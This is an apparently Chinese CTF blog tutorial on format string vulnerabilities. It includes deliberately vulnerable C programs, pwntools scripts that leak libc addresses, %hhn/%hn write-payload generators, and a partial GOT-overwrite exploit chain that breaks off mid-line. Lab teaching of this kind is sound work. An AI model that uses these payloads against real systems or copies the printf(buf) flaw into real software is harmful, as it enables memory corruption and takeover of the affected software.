@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>格式化字符串的再认识 | Find the way to...</title><meta name="author" content="Stribik"><meta name="copyright" content="Stribik"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这里主要是想要重新梳理一下有关格式化字符串相关的考点。 这里将从一些可以调试的代码出发，来探索格式化字符串漏洞最常用的三个应用场景。  一、原理简介：在cdel的调用约定中，规定了printf（）函数将参数从右往左依次压栈。格式化字符串符号与其参数一一对应，同时也对应了栈上的数据。 当我们格式化字符串参数和给定参数一一对应的时候，不会发生什么问题，但是当我们给的参数和格式化字符串参数对不上的时候，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串的再认识">
+<meta property="og:url" content="http://example.com/2024/01/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86/index.html">
+<meta property="og:site_name" content="Find the way to...">
+<meta property="og:description" content="这里主要是想要重新梳理一下有关格式化字符串相关的考点。 这里将从一些可以调试的代码出发，来探索格式化字符串漏洞最常用的三个应用场景。  一、原理简介：在cdel的调用约定中，规定了printf（）函数将参数从右往左依次压栈。格式化字符串符号与其参数一一对应，同时也对应了栈上的数据。 当我们格式化字符串参数和给定参数一一对应的时候，不会发生什么问题，但是当我们给的参数和格式化字符串参数对不上的时候，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-01-25T04:42:02.000Z">
+<meta property="article:modified_time" content="2024-01-27T02:43:39.977Z">
+<meta property="article:author" content="Stribik">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/01/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '格式化字符串的再认识',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-27 10:43:39'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Find the way to..." type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Find the way to..."><span class="site-name">Find the way to...</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">格式化字符串的再认识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-25T04:42:02.000Z" title="发表于 2024-01-25 12:42:02">2024-01-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-27T02:43:39.977Z" title="更新于 2024-01-27 10:43:39">2024-01-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/ctfpwn/">ctfpwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/ctfpwn/fmt/">fmt</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="格式化字符串的再认识"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这里主要是想要重新梳理一下有关格式化字符串相关的考点。</p>
+<p>这里将从一些可以调试的代码出发，来探索格式化字符串漏洞最常用的三个应用场景。</p>
+<hr>
+<h3 id="一、原理简介："><a href="#一、原理简介：" class="headerlink" title="一、原理简介："></a>一、原理简介：</h3><p>在cdel的调用约定中，规定了printf（）函数将参数从右往左依次压栈。格式化字符串符号与其参数一一对应，同时也对应了栈上的数据。</p>
+<p>当我们格式化字符串参数和给定参数一一对应的时候，不会发生什么问题，但是当我们给的参数和格式化字符串参数对不上的时候，这里就会出现一些问题了。</p>
+<p>当我们的格式化字符串字符大于所提供的参数的时候，就会出现直接从栈上读取数据的效果，由此也就产生了我们的格式化字符串漏洞。</p>
+<p>（一点个人的理解，可能有误）</p>
+<h3 id="二、漏洞利用："><a href="#二、漏洞利用：" class="headerlink" title="二、漏洞利用："></a>二、漏洞利用：</h3><h4 id="1、泄露数据"><a href="#1、泄露数据" class="headerlink" title="1、泄露数据"></a>1、泄露数据</h4><p>根据前面原理部分我们也能知道，这里我们可以轻松泄露出栈上我们所需要的数据。</p>
+<p>这里最常见的是三种形式：%p%x；%s(%p用的更多一点)。简单解释一下：前一个基本用来获得指定位置参数的内存值，后一个用来获得对应地址的内容，但是存在0截断，用的也比较少。</p>
+<p>本地测试代码1：（确定栈偏移）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdout,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">99</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译选项：</p>
+<p>（32位）gcc fmt1.c -m32 -fno-stack-protector -no-pie -o fmt1_32</p>
+<p>调试：（输入aaaa.%p.%p.%p.%p.%p.%p.%p.%p，然后查看栈信息）</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706076730293-31e7a680-212e-4143-82ff-d214a9abc001.png" alt="img"></p>
+<p>输出信息：aaaa.0xffffcfcc.0x63.(nil).(nil).0x1.0xf7ffda40.0x61616161.0x2e70252e</p>
+<p>解释：这个时候我们的数据是直接写在栈上的，通过这样一番操作我们可以计算得到我们实际的数据栈和内存空间之间的偏移（我就称它为栈偏移），这里的第七个参数输出了我们的aaaa（0x61开头的），所以这里的栈偏移就是7.</p>
+<p>另一种计算方式：</p>
+<p>给printf函数设下断点，找到第一个参数存放的位置(也就是这里的0xffffcfcc)，利用fmtarg计算：</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706078274863-91eca6ec-4c9e-4497-9574-f7fe46448c72.png" alt="img"></p>
+<p>这里64位同理但是要注意位数，因为会占寄存器的位置。</p>
+<hr>
+<p>本地测试代码2：（泄露libc基地址）</p>
+<p>基本格式：<addr>%<order>$s</p>
+<p>用$s会存在00截断的问题，这里可以改进为<address>@@%<order>$s@@</p>
+<p><strong>32位&#x3D;&gt;</strong></p>
+<p>（1）选定got表:</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706084212473-a38db7a9-25d8-4591-b464-99da3518bb34.png" alt="img"></p>
+<p>read&#x2F;printf都可以，但是要注意截断。</p>
+<p>测试脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./fmt1_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt1_32&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">payload = p32(<span class="number">0x0804c010</span>) + <span class="string">b&#x27;@@%7$s@@&#x27;</span></span><br><span class="line"><span class="comment"># raw_input(&#x27;-&gt;&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;@@&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak-&gt;&#x27;</span> +<span class="built_in">hex</span>(u32(io.recv(<span class="number">4</span>))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read-libc.symbols-&gt;&#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：（这里毕竟没开pie，确实是满足的）</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706085105707-134182df-5b5b-4952-a825-030407be1a02.png" alt="img"></p>
+<p><strong>64位&#x3D;&gt;</strong></p>
+<p><strong>区别：</strong>高位地址必定是0，所以地址要放后面，这里就必须要考虑字节对齐的问题。</p>
+<p>这样一来，就必须重新确定偏移：（依旧可以用fmtarg来算）</p>
+<p>脚本和上面差不多，但是重新算偏移（滑铁卢，本地版本不一样没调出来QAQ）。</p>
+<p><strong>通用方法：</strong></p>
+<p>这里我就必须要推荐使用_libc_start_main+xxx(libc版本不一样会发生改变)</p>
+<p>主要还是因为这个函数的非常好找，用来泄露libc基地址真的很方便。</p>
+<p>在read之后查看stack信息：</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706087294352-7a476ca7-98bc-4623-85db-2a724d627e31.png" alt="img"></p>
+<p>结果检查：</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706087492683-5df5940a-911a-4719-adbe-9a979a1eaa25.png" alt="img"></p>
+<p>注意这里是到128.</p>
+<p>测试脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./fmt1_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt1_64&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">payload = <span class="string">b&#x27;%20$p&#x27;</span>.ljust(<span class="number">0x8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#raw_input(b&#x27;-&gt;&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">128</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak-&gt;&#x27;</span> +<span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、地址改写："><a href="#2、地址改写：" class="headerlink" title="2、地址改写："></a>2、地址改写：</h4><p>两类：栈上改写、任意地址改写。（一般来说任意地址用的多，栈上遇上了再说吧）</p>
+<p><strong>形式：%n  &#x2F;  格式：[overwrite addr]…%[offset]$n</strong></p>
+<p><strong>一般会配合%c使用，用来控制写入的字符数</strong></p>
+<p>（关于这几种常见的转换符，这里进一步补充：）</p>
+<p>%s：获得<strong>指定变量</strong>所<strong>对应地址</strong>的内容，有00截断。</p>
+<p>%p：把指向的内存的值直接输出（不作为地址去访问指向的东西）</p>
+<p>%n：把读到的值看作一个地址，把printf已经输出的字符数量写入到这个这个地址指向的</p>
+<p>（</p>
+<p>%n          一次性写入 4 个字节</p>
+<p>%hn         一次性写入 2 个字节</p>
+<p>%hhn        一次性写入 1 个字节</p>
+<p>）</p>
+<p><strong>（1） 单次printf的多次写入</strong>：（可以把多个格式化字符串结合在一起）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%xc%offset1$hn %yc%offset2$hn address address+<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）</strong> <strong>多次写入时控制输出的字符数</strong></p>
+<p>要注意的是**%n写入的值是其前面输出的字符数。**</p>
+<ol>
+<li>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 &#x3D; 16.</li>
+<li>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为%30c% offset$hhn</li>
+<li>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）&#x3D;0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 &#x3D; 0xD0（208），也就是填入%208c%offset$hhn即可。</li>
+</ol>
+<p>当然这也是很规律的，在控制一个输出字符数，就分为3种情况：</p>
+<ul>
+<li>前面已经输出的字符数小于这次要输出的字符数</li>
+<li>前面已经输出的字符数等于于这次要输出的字符数</li>
+<li>前面已经输出的字符数大于这次要输出的字符数</li>
+</ul>
+<p>可使用的自动化脚本：</p>
+<p>单字节：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># prev 前面已经输出多少字节，val 写入值，idx 偏移</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_byte</span>(<span class="params">prev,val,idx,byte=<span class="number">1</span></span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; val :</span><br><span class="line">        result += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(val - prev) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == val :</span><br><span class="line">        result += <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        result += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">256</span>**byte - prev + val) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    result += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(idx) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#搭配：</span></span><br><span class="line">prev = <span class="number">0</span> </span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样</span></span><br><span class="line"><span class="comment"># idx是偏移，key是要写入的目标值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    payload +=fmt_byte(prev,(key &gt;&gt; <span class="number">8</span>*i) &amp; <span class="number">0xff</span>,idx+i) </span><br><span class="line">    prev = (key &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure>
+
+<p>双字节：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#跟上个基本一样，只是改了部分地方</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_short</span>(<span class="params">prev,val,idx,byte = <span class="number">2</span></span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; val :</span><br><span class="line">        result += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(val - prev) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == val :</span><br><span class="line">        result += <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        result += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">256</span>**byte - prev + val) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    result += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(idx) + <span class="string">&quot;$hn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">prev = <span class="number">0</span> </span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    payload +=fmt_short(prev,(key &gt;&gt; <span class="number">16</span>*i) &amp; <span class="number">0xffff</span>,idx+i) </span><br><span class="line">    prev = (key &gt;&gt; i*<span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br></pre></td></tr></table></figure>
+
+<p>最后，经常会用上.ljust( )来控制长度，对齐。</p>
+<p>（3）fmtstr（pwntools自带的一个格式化字符串板块）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>简单题没问题，难一点就不太好用了。</p>
+<h3 id="三、综合性使用："><a href="#三、综合性使用：" class="headerlink" title="三、综合性使用："></a>三、综合性使用：</h3><p>目标：fmt泄露基地址，修改got表，从而拿到shell。</p>
+<p>测试代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x101</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译选项：</p>
+<p> 32位</p>
+<p> gcc fmt2.c -z norelro -m32 -o fmt2_32</p>
+<p> 64位</p>
+<p> gcc fmt2.c -z norelro -o fmt2_64</p>
+<p><strong>32位：</strong></p>
+<p><strong>（像模像样地打一遍嘿嘿）</strong></p>
+<p>1、checksec：</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706170669993-7a586e2a-b8c6-4512-9ee5-08fa16f05e60.png" alt="img"></p>
+<p>2、泄露libc基地址：</p>
+<p>首先，随便输点什么看下我们栈情况：</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706172212888-ce198d37-7402-45e8-bae9-81d13a82cea0.png" alt="img"></p>
+<p>这里是我们函数开始的地方。</p>
+<p><img src="/../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86.assets/1706172247480-4329c517-861a-46db-ae76-ffe2d86f3d70.png" alt="img"></p>
+<p>看到buf上第三个参数对应了我们函数开始得地方，这里可以泄露程序基地址。</p>
+<p>第11个参数可以看到我们的实际存储地址，那么第一部分泄露libc基地址就可以这样写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 泄露程序基地址</span></span><br><span class="line">payload = <span class="string">b&#x27;%3$x&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">pwn_base = main_addr - pwn_elf.got[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;binary base address: 0x%x&#x27;</span> % pwn_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc基地址</span></span><br><span class="line">read_got = pwn_base + pwn_elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span> + p32(read_got) + <span class="string">b&#x27;%11$s&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(p32(read_got))	<span class="comment"># io.recv(5)</span></span><br><span class="line">libc_read = io.recv(<span class="number">4</span>)</span><br><span class="line">libc_base = u32(libc_read) - 